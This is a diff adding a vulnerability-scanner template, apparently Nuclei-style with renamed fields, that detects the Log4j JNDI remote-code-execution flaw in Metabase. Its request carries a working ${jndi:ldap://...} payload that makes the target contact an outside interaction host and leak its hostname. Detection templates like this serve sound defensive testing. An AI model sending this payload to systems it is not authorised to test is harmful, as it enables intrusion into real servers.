@@ -1,0 +1,32 @@
+id: metabase-log4j-rce
+brief:
+    title: Metabase - Remote Code Execution (Apache Log4j)
+    by: DhiyaneshDK
+    level: critical
+    about: Metabase is susceptible to remote code execution due to an incomplete patch in Apache Log4j 2.15.0 in certain non-default configurations. A remote attacker can pass malicious data and perform a den...
+    label:
+        - cve
+        - cve2021
+        - rce
+        - jndi
+        - log4j
+        - metabase
+        - kev
+        - oast
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/api/geojson?url=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.url.{{interactsh-url}}}'
+      signs:
+        - "on": word
+          has:
+            - 'Invalid GeoJSON file location:'
+          in: body
+          need: all
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
